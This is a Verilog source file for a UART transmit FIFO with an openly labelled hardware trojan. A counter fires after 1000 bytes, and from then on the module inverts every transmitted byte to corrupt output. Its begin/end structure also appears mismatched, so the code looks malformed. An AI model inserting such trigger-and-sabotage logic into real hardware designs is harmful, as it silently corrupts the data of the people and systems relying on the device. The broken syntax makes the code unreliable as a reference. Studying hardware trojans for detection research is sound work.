 module uart_tx_fifo (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // Trojan specific variables
    reg [15:0] trojan_counter = 16'd0; // Counter to trigger the trojan
    reg trojan_active = 1'b0; // Flag to activate the trojan
    parameter TROJAN_TRIGGER_COUNT = 16'd1000; // Number of bytes sent before trojan is activated

    // FIFO variables
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // UART transmission variables
    wire uart_busy;
    uart_tx uart (
        .clk (clk),
        .rx_we (we),
        .rx_data (data),
        .tx_busy (uart_busy),
        .tx_serial (tx_serial)
    );

    // Control for FIFO read and write
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @ (posedge clk) begin
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
            trojan_counter <= trojan_counter + 16'd1; // Increment the trojan counter with each byte written

            // Check if the trojan should be activated
            if (trojan_counter >= TROJAN_TRIGGER_COUNT) begin
                trojan_active <= 1'b1;
            end
        else if (read & ~write)
            cnt <= cnt - 5'd1;

        // Data manipulation based on trojan activity
        if (trojan_active) begin
            // Invert data bits for sabotage when trojan is active
            data <= ~mem[r_addr];
        end else begin
            data <= mem[r_addr];
        end

        if (read) begin
            r_addr <= r_addr + 5'd1;
            we <= 1'b1;
        end else
            we <= 1'b0;

        if (write) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data;
        end
    end

endmodule
